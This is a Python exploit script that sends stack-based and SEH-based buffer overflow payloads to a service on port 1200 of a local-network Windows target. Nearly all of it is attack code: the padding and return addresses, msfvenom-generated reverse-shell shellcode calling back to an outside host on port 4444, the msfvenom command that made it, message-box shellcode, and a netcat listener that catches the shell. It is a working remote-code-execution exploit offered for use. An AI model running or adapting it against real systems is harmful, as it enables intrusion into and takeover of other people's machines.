# Code to perform Stack Based and SEH based Buffer Overflow and get Shell access.

import time
import socket
import subprocess
host = '192.168.43.5'		# Ip Address of the Target Machine
port = 1200                  	# Open port on the Server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))		# Connecting to the Port on target machine

# Stack-Based Buffer Overflow

junk = b"A"*548			# Number of A's to send
EIP = b'\xdf\x11\x0c\x61'	# JMP EIP Address
move_esp = b'\x81\xc4\xc0\xfd\xff\xff'

# Creating a reverse_tcp Shellcode using metasploit.
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.43 LPORT=4444 -b '\x00\x0a\x0d' -f c

reverse_tcp = b'\xdd\xc4\xba\x39\xab\x07\x73\xd9\x74\x24\xf4\x5b\x33\xc9\xb1\x52\x31\x53\x17\x83\xc3\x04\x03\x6a\xb8\xe5\x86\x70\x56\x6b\x68\x88\xa7\x0c\xe0\x6d\x96\x0c\x96\xe6\x89\xbc\xdc\xaa\x25\x36\xb0\x5e\xbd\x3a\x1d\x51\x76\xf0\x7b\x5c\x87\xa9\xb8\xff\x0b\xb0\xec\xdf\x32\x7b\xe1\x1e\x72\x66\x08\x72\x2b\xec\xbf\x62\x58\xb8\x03\x09\x12\x2c\x04\xee\xe3\x4f\x25\xa1\x78\x16\xe5\x40\xac\x22\xac\x5a\xb1\x0f\x66\xd1\x01\xfb\x79\x33\x58\x04\xd5\x7a\x54\xf7\x27\xbb\x53\xe8\x5d\xb5\xa7\x95\x65\x02\xd5\x41\xe3\x90\x7d\x01\x53\x7c\x7f\xc6\x02\xf7\x73\xa3\x41\x5f\x90\x32\x85\xd4\xac\xbf\x28\x3a\x25\xfb\x0e\x9e\x6d\x5f\x2e\x87\xcb\x0e\x4f\xd7\xb3\xef\xf5\x9c\x5e\xfb\x87\xff\x36\xc8\xa5\xff\xc6\x46\xbd\x8c\xf4\xc9\x15\x1a\xb5\x82\xb3\xdd\xba\xb8\x04\x71\x45\x43\x75\x58\x82\x17\x25\xf2\x23\x18\xae\x02\xcb\xcd\x61\x52\x63\xbe\xc1\x02\xc3\x6e\xaa\x48\xcc\x51\xca\x73\x06\xfa\x61\x8e\xc1\xc5\xde\x91\x3a\xae\x1c\x91\x2d\x72\xa8\x77\x27\x9a\xfc\x20\xd0\x03\xa5\xba\x41\xcb\x73\xc7\x42\x47\x70\x38\x0c\xa0\xfd\x2a\xf9\x40\x48\x10\xac\x5f\x66\x3c\x32\xcd\xed\xbc\x3d\xee\xb9\xeb\x6a\xc0\xb3\x79\x87\x7b\x6a\x9f\x5a\x1d\x55\x1b\x81\xde\x58\xa2\x44\x5a\x7f\xb4\x90\x63\x3b\xe0\x4c\x32\x95\x5e\x2b\xec\x57\x08\xe5\x43\x3e\xdc\x70\xa8\x81\x9a\x7c\xe5\x77\x42\xcc\x50\xce\x7d\xe1\x34\xc6\x06\x1f\xa5\x29\xdd\x9b\xd5\x63\x7f\x8d\x7d\x2a\xea\x8f\xe3\xcd\xc1\xcc\x1d\x4e\xe3\xac\xd9\x4e\x86\xa9\xa6\xc8\x7b\xc0\xb7\xbc\x7b\x77\xb7\x94'

# shellcode for displaying a messagebox.

msgbox = b"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff\xd7"

# For SEH Based
junk_seh = b'A'*636			# Number of A's to send
next_seh = b'\xeb\x04\x90\x90'		# 4 byte JMP Address
seh = b'\x0b\x14\x0c\x61'		# Address of SEH
nops = b'\x90'*4

# To run SEH Based exploit umcomment the following SEH Based exploit and comment the Stack Based exploit.

# s.sendall(junk_seh+next_seh+seh+nops+msgbox)	# SEH Base Exploit
s.sendall(junk+EIP+move_esp+reverse_tcp)	# STACK-Based Exploit
s.close()					# Closing Port 1200
print("The message has been sent.")

# Calling Netcat command to listen to port 4444 and get the shell of target machine.

from subprocess import call
call(["nc","-lvp","4444"])

